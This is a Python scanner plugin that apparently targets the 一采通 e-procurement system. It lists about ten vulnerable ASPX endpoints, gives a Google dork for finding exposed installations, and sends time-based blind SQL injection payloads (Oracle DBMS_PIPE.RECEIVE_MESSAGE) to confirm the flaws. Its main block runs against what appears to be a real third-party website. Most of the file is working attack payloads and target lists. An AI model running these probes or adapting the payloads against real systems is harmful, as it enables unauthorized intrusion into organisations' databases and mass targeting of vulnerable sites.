#!/usr/bin/evn python
#-*-:coding:utf-8 -*-

#Author:wonderkun
#Name: 一采通电子采购系统十处SQL注入漏洞打包
#google dork：inurl:companycglist.aspx?ComId=*
#Refer:http://wooyun.org/bugs/wooyun-2010-0117552
#Refer: http://wooyun.org/bugs/wooyun-2010-0117795
#Refer:http://wooyun.org/bugs/wooyun-2010-0117552
#Refer:http://wooyun.org/bugs/wooyun-2010-0117545
#Refer:http://wooyun.org/bugs/wooyun-2010-079420
#Refer:http://wooyun.org/bugs/wooyun-2010-062918

import time

'''
/Plan/TitleShow/ApplyInfo.aspx?ApplyID=1
/Price/AVL/AVLPriceTrends_SQU.aspx?classId=1
/Price/SuggestList.aspx?priceid=1
/PriceDetail/PriceComposition_Formula.aspx?indexNum=3&elementId=1
/Products/Category/CategoryOption.aspx?option=IsStop&classId=1
/Products/Tiens/CategoryStockView.aspx?id=1
/custom/CompanyCGList.aspx?ComId=1
/SuperMarket/InterestInfoDetail.aspx?ItemId=1
/Orders/k3orderdetail.aspx?FINTERID=1
/custom/CompanyCGList.aspx?ComId=1
/custom/GroupNewsList.aspx?child=true&groupId=121
orcal 数据库
'''

def assign(service,arg):
    if service=="1caitong":
        return True,arg

def audit(arg):
    vun_urls=['Plan/TitleShow/ApplyInfo.aspx?ApplyID=1',
              'Price/AVL/AVLPriceTrends_SQU.aspx?classId=1',
              'Price/SuggestList.aspx?priceid=1',
              'PriceDetail/PriceComposition_Formula.aspx?indexNum=3&elementId=1',
              'Products/Category/CategoryOption.aspx?option=IsStop&classId=1',
              'Products/Tiens/CategoryStockView.aspx?id=1',
              'custom/CompanyCGList.aspx?ComId=1',
              'SuperMarket/InterestInfoDetail.aspx?ItemId=1',
              'Orders/k3orderdetail.aspx?FINTERID=1',
              'custom/CompanyCGList.aspx?ComId=1',
              'custom/GroupNewsList.aspx?child=true&groupId=121']
    
    payload0="%20AND%206371=DBMS_PIPE.RECEIVE_MESSAGE(11,0)"
    payload1="%20AND%206371=DBMS_PIPE.RECEIVE_MESSAGE(11,5)"
    for vun_url in vun_urls:
        time0=time.time()
        code1,head,res,errcode,finalurl=curl.curl2(arg+vun_url+payload1)
        time1=time.time()
        code2,head,res,errcode,finalurl=curl.curl2(arg+vun_url+payload0)
        time2=time.time()
        if code1!=0 and code2!=0 and ((time1-time0)-(time2-time1))>4:
            security_hole('sql inject:'+arg+vun_url)
            

if __name__=='__main__':
    from dummy import  *
    audit(assign('1caitong','http://www.qlszb.com/')[1])
    # audit(assign('1caitong','http://eps.taikai.cn/')[1])